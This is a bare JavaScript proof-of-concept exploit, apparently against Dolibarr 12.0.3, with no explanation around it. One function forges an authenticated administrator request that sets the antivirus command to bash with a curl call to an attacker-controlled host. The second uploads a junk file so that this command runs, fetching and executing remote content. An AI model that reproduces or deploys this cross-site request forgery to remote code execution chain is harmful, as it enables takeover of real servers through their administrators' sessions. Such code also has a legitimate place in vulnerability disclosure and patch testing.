function changeBinary() {
    var xhr1 = new XMLHttpRequest();
    xhr1.open("POST", "http:\/\/127.0.0.1\/projects\/dolibar\/12.0.3\/htdocs\/admin\/security_file.php", true);
    xhr1.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/webp,*\/*;q=0.8");
    xhr1.setRequestHeader("Accept-Language", "fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3");
    xhr1.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded");
    xhr1.withCredentials = true;
    var body1 = "token=%242y%2410%24oi7TOu6vwFc1h1h87wNyNuT%2Fd0lH3cXUX5NpvzQ%2FwPZyGpKOrIW4G&action=updateform&MAIN_UPLOAD_DOC=2048&MAIN_UMASK=0664&MAIN_ANTIVIRUS_COMMAND=bash&MAIN_ANTIVIRUS_PARAM=-c+%22%24%28curl+http%3A%2F%2F<URL_UNDER_OUR_CONTROL>%3A<RELATED_PORT>%2Fpoc.txt%29%22&button=Modifier";
    var aBody1 = new Uint8Array(body1.length);
    for (var i = 0; i < aBody1.length; i++)
        aBody1[i] = body1.charCodeAt(i); 
    xhr1.send(new Blob([aBody1]));
}

function triggerBinary() {
    var xhr2 = new XMLHttpRequest();
    xhr2.open("POST", "http:\/\/127.0.0.1\/projects\/dolibar\/12.0.3\/htdocs\/admin\/security_file.php", true);
    xhr2.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/webp,*\/*;q=0.8");
    xhr2.setRequestHeader("Accept-Language", "fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3");
    xhr2.setRequestHeader("Content-Type", "multipart\/form-data; boundary=---------------------------38749762618930241634203718874");
    xhr2.withCredentials = true;
    var body2 = "-----------------------------38749762618930241634203718874\r\n" + 
        "Content-Disposition: form-data; name=\"token\"\r\n" + 
        "\r\n" + 
        "$2y$10$pnXTTqQ7R1h2epVIAd3yce83Jh6n1eV.ul59VligSe0MJ0W/grGPe\r\n" + 
        "-----------------------------38749762618930241634203718874\r\n" + 
        "Content-Disposition: form-data; name=\"section_dir\"\r\n" + 
        "\r\n" + 
        "\r\n" + 
        "-----------------------------38749762618930241634203718874\r\n" + 
        "Content-Disposition: form-data; name=\"section_id\"\r\n" + 
        "\r\n" + 
        "0\r\n" + 
        "-----------------------------38749762618930241634203718874\r\n" + 
        "Content-Disposition: form-data; name=\"sortfield\"\r\n" + 
        "\r\n" + 
        "\r\n" + 
        "-----------------------------38749762618930241634203718874\r\n" + 
        "Content-Disposition: form-data; name=\"sortorder\"\r\n" + 
        "\r\n" + 
        "\r\n" + 
        "-----------------------------38749762618930241634203718874\r\n" + 
        "Content-Disposition: form-data; name=\"max_file_size\"\r\n" + 
        "\r\n" + 
        "2097152\r\n" + 
        "-----------------------------38749762618930241634203718874\r\n" + 
        "Content-Disposition: form-data; name=\"userfile[]\"; filename=\"junk.txt\"\r\n" + 
        "Content-Type: text/plain\r\n" + 
        "\r\n" + 
        "junk\n" + 
        "\r\n" + 
        "-----------------------------38749762618930241634203718874\r\n" + 
        "Content-Disposition: form-data; name=\"sendit\"\r\n" + 
        "\r\n" + 
        "Envoyer fichier\r\n" + 
        "-----------------------------38749762618930241634203718874--\r\n";
    var aBody2 = new Uint8Array(body2.length);
    for (var i = 0; i < aBody2.length; i++)
        aBody2[i] = body2.charCodeAt(i); 
    xhr2.send(new Blob([aBody2]));
}

changeBinary();
setTimeout(triggerBinary, 3000);